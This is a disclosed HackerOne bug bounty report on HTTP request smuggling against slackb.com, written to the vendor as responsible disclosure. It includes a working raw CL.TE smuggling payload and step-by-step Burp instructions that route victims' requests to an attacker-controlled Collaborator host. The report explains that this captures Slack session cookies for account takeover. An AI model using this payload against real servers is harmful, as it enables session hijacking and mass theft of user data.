# Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies

## Report Details
- **Report ID**: 737140
- **URL**: https://hackerone.com/reports/737140
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-11-14T00:07:59.113Z
- **Disclosed**: 2020-03-12T00:29:01.426Z

## Reporter
- **Username**: defparam
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: slack

## Vulnerability Information
Hi Slack Security Team!

My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a month long bounty promotion I decided to take a little of my time and gently perform recon on your platform. Specifically the area of interest I focus in is HTTP Request Smuggling. I developed tooling to actively target some advanced HTTP Smuggling exploits and ran it on your in-scope assets. In my research I stumbled across a finding that I consider extremely critical not only for Slack but for all customers and organizations which share their privatedata/channels/conversations on Slack.

The bug chain is as follows:
1) HTTP Request Smuggling CTLE to Arbitrary Request Hijacking (Poisoned Socket) on `slackb.com`
2) Request Hijack forces victim HTTP requests to instead use `GET https://<URL> HTTP/1.1` on `slackb.com`
3) A request of `GET https://<URL> HTTP/1.1` on the backend server socket results in a 301 redirect to `https://<URL>` with slack cookies (most importantly the `d` cookie)
4) Me with my Burp Collaborator steals victims cookies by using a collaborator server as the defined <URL> in the attack
5) Me (if I were evil) collects massive amounts of `d` session cookies and steals any/all possble Slack user/organization data from victim sessions

So let's start from the beginning. I was running `smuggler -u https://slackb.com` running my array of exhaustive tests when I stumbled upon a failure with test: `space1` (see below)

{F633736}

The `space1` tests checks for HTTP desync with the following payload:

{F633737}

This testcase failed on testing a CLTE and not a TECL. A CLTE is a webrequest that has both the `Transfer-Encoding: chunked` header (specified in some abnormal way) and the `Content-Length: ` header. According to the RFC when both headers are specified the TE always takes priority. However, if the TE header is malformed the webrequest may get interpreted differently between the frontend and the backend server. The CLTE issue found on slackb.com is when the frontend server interprets the request sized using `Content-Length` and the backend server interprets the request using the `Transfer-Encoding: chunked` method. This causes a desync on the webrequest and can poison the backend socket causing data to be pre-pended to the next webrequest from a victim. The `space1` payload places a space character in between `Transfer-Encoding` and the colon `:`. This is enough for the frontend to not understand the request as TE and instead as CE but not enough for the backend to process it in the same way.

One popular attack with a CLTE is to prepend data to the next request that would "erase" the victim's HTTP request using a custom header semantic and for the poison socket data to re-specify the HTTP method and endpoint. Here is what the payload looks like with the `slackb.com` attack. The best way I can explain it is through Visio using these diagrams (see below)

{F633741}

Explanation of the malicious request:

{F633743}

Here are your steps to triage:
1) Open up a fresh Burp
2) Open up a fresh Collaborator by going to menu: `Burp->Burp Collaborator Client`
3) In the Collaborator Client click on `Copy to clipboard` for the server URL
4) Go to the Repeater tab
5) Add the following payload and replace <URL> with your collaborator URL
```
GET / HTTP/1.1
Transfer-Encoding : chunked
Host: slackb.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET <URL> HTTP/1.1
X: X
```
6) Set the repeater target to: `host: slackb.com , Port: 443 (SSL)`  by double clicking on target
7) Press go
8) In the Collaborator window click `Poll now` until you see requests

The attack should roughly look like this:
Burp Repeater:
{F633745}

Collaborator DNS request: (The Victim's IP Address is leaked too!)
{F633746}

The special cookie stolen from this attack:
{F633749}

At this point you just attacked an arbitrary slack customer and have access to her `d` session cookie.
From here you can plug the session cookie into your browser and have full account takeover, Scrape all data and move onto the next victim.

I'm happy to help if you have any further questions. Most of my requests have been made using the `User-Agent: Smuggler/v1.0` header, feel free to review traffic logs keying off that.

Have a nice day!
Best,
Evan

## Impact

So it is my opinion that this is a severe critical vulnerability that could lead to a massive data breach of a majority of customer data. With this attack it would be trivial for a bad actor to create bots that consistantly issue this attack, jump onto the victim session and steal all possible data within reach. 

I am really happy I found this for you guys so that it can be dealt with ASAP. I really hope there haven't been any attacks on customers using this vulnerability.

Best Wishes,
Evan

## Attachments
- s1.png
- s2.png
- CLTE_explained.png
- Redirect_Explained.png
- burp_1.png
- collab_1.png
- collab_2.png
